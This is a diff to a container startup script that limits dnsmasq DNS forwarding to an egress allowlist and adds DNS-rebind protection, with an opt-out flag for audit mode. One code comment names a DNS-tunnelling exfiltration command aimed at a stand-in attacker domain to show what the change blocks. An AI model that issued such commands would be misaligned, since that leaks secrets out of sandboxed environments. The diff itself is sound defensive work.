@@ -74,8 +74,20 @@ printf '%s\n' $dns_up > /run/sluice-dns-upstream   # init-firewall allows these 
   echo "user=root"                 # wolfi-base has no dnsmasq/nobody user to drop to
   echo "cache-size=2000"
   echo "min-cache-ttl=3600"        # pin pool IPs long enough that client + squid agree
-  for u in $dns_up; do echo "server=$u"; done
+  # Resolution is scoped to the egress allowlist: dnsmasq forwards only allowlisted names (per-domain
+  # server= lines in the servers-file, re-read on SIGHUP for `learn`), so an app can't tunnel exfil as
+  # DNS labels to an off-allowlist nameserver (dig secret.attacker.com -> no upstream -> REFUSED).
+  # stop-dns-rebind drops RFC1918 answers (DNS-rebinding/SSRF into your network). learn --audit and
+  # SLUICE_DNS_OPEN=1 keep the old forward-all behaviour (reach hosts off the allowlist).
+  if [ "${SLUICE_DNS_OPEN:-}" = 1 ] || [ "${SLUICE_AUDIT:-}" = 1 ]; then
+    for u in $dns_up; do echo "server=$u"; done
+  else
+    echo "stop-dns-rebind"
+    echo "rebind-localhost-ok"
+    echo "servers-file=/run/dnsmasq-servers.conf"
+  fi
 } > /run/dnsmasq-sluice.conf       # /run (not /etc) so it works under a read-only rootfs
+[ "${SLUICE_DNS_OPEN:-}" = 1 ] || [ "${SLUICE_AUDIT:-}" = 1 ] || /usr/local/bin/sluice-dns-allow
 dnsmasq --conf-file=/run/dnsmasq-sluice.conf
 # Point client + squid at the dnsmasq cache. Read-only mode already has resolv.conf=127.0.0.1 (--dns).
 [ "${SLUICE_READONLY_ROOT:-}" = 1 ] || printf 'nameserver 127.0.0.1\n' > /etc/resolv.conf
